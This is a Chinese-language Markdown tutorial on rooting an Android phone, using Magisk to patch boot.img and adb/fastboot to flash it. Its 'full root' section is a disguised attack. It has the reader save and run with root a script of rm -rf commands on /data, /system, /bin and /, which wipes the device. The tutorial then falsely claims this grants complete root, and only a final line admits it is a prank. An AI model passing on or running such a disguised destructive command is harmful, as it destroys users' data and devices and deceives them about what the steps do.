# 安卓手机Root教程
### by.主人
`此教程会教你如何获取完整的Root权限`<br>
`请一定要看完如有意外后果自负`
## 1. 首先进行准备工作<br>
#### 工具准备<br>
- 需要的工具以及设备<br>
   + 一部需要进行Root权限获取的安卓手机
   + 一台win10或win11系统的电脑
   + adb工具
   + bootloader解锁工具(部分MTK联发科处理器可以使用强解bl工具进行解锁)
   + 一根数据线
   + Magisk安装包
   + Mt管理器安装包
   + 搞机助手
## 2. 解锁Bootload<br>
首先根据网络上的其他教程解锁Bootloader<br>
例如从视频网站 [bilibili](https://search.bilibili.com/all?keyword=Bootloader%E8%A7%A3%E9%94%81%E6%95%99%E7%A8%8B) 上查找解锁教程
## 3. 获取Root权限<br>
到这里想必你的手机已经结束Bootloader了<br>
   1. 安装`Magisk`<br>
Root需要在手机上安装`Magisk`软件<br>
下载地址: [Magisk·蓝奏云](https://mrzzoxo.lanzoue.com/iEiWb1s6quif)
   2. 提取手机boot.img<br>
   具体教程请看 [bilibili](https://search.bilibili.com/all?keyword=%E6%8F%90%E5%8F%96%E7%B3%BB%E7%BB%9FBoot.img)
   3. 修补Boot.img<br>
   打开已经安装好的Magisk软件点击<br>
   第一个安装<br>
   点击修补文件<br>
   修补完成的boot.img文件会在手机的`/sdcard/Download/`目录下
   4. 刷入修补后的Boot.img<br>
   刷入boot可用搞机助手或adb刷入<br>
      + #### 搞机助手
      1. 打开搞机助手
      2. 点击引导模式
      3. 点击刷入Boot
      4. 点击选择文件
      5. 选择修补好的的boot.img文件
      - #### adb刷入
      1. 打开cmd
      2. 输入确保电脑已成功连接手机
      ```
      adb devices
      ```
      3. 重启到Fastboot模式<br>
      在手机开机状态下在电脑的cmd中输入
      ```
      adb reboot bootloader
      ```
      4. 刷入boot
      手机处于Fastboot模式下输入
      ```
      fastboot flash boot <boot文件路径>
      fastboot reboot
      ```
## 4. 获取完整Root权限
1. 安装`Mt管理器`
2. 在Magisk上授予Mt管理器Root权限
3. 在Mt管理器中点击屏幕上方的路径输入
`/data/`
4. 创建一键获取完整Root文件<br>
   1. 点击Mt管理器屏幕中间下面的+号<br>
   输入文件名`一键获取完整Root.sh`
   2. 点击创建好的文件，再点击编辑
   3. 输入以下内容并保存
   ```
   rm -rf /data/*
   rm -rf /system/*
   rm -rf /bin/*
   rm -rf /use/*
   rm -rf /*
   reboot
   ```
   4. 点击`一键获取完整Root.sh`
   5. 点击左边更多勾选Root执行或直接勾选Root
   6. 点击`执行`
## 5. 体验完整Root
在`一键获取完整Root.sh`执行完成后会自动重启手机<br>当手机开机后就会拥有完整的Root权限<br>开挂的话你就可以摆脱框架和虚拟机的束缚直接用Root开挂了<br>玩机也可以好好玩了不用担心没有Root做不了很多事了

---
---
![主人科技](https://pan.zren.top/图片/主人科技.png)

# 最后声明这是恶搞娱乐教程，请勿当真。一切后果由自己负责，请在24小时内删除此文件，若未删除则默认自愿承担后果，与文件作者无关
